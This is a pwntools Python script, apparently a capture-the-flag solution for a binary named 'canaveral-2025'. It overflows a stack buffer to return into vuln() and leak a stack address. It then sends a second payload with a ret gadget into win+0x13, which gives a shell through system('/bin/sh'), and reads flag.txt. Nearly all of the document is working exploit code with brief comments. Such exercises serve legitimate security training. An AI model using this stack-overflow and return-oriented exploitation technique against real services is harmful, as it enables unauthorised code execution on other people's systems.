import os
from pwn import *

BIN = '.build/canaveral-2025' if os.path.exists('.build/canaveral-2025') else 'canaveral-2025'
exe = ELF(BIN)
context.binary = exe

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25603))

#p = process(BIN)
p = remote(HOST, PORT)

p.recvuntil(b':')

# First return into vuln() again to get a stack leak and a second read().
payload = b'A' * 0x48 + p64(exe.sym['vuln'])

p.sendline(payload)

p.recvuntil(b'prize: ')

leak = int(p.recvline().strip(), 16)

info(f"[+] Buf @ {hex(leak)}")

p.recvuntil(b':')

# Stage the "/bin/sh" string and the required a==0x31337 argument, then call
# win(a=0x31337, b=&"/bin/sh") via a ret-slide into win+0x13 (System V arg regs
# set up by the preceding gadget chain).
payload2 = p64(0x402008) + b'A' * 0x4 + p64(0x31337)
payload2 += b'A' * (0x48 - len(payload2) - 0x8) + p64(leak + 0x18) + p64(0x000000000040101a) + p64(exe.sym['win'] + 0x13)

p.sendline(payload2)

p.recvline()

# win() runs system("/bin/sh"); grab the flag.
p.sendline(b'cat flag.txt')
print(p.recvrepeat(2).decode(errors='replace'))
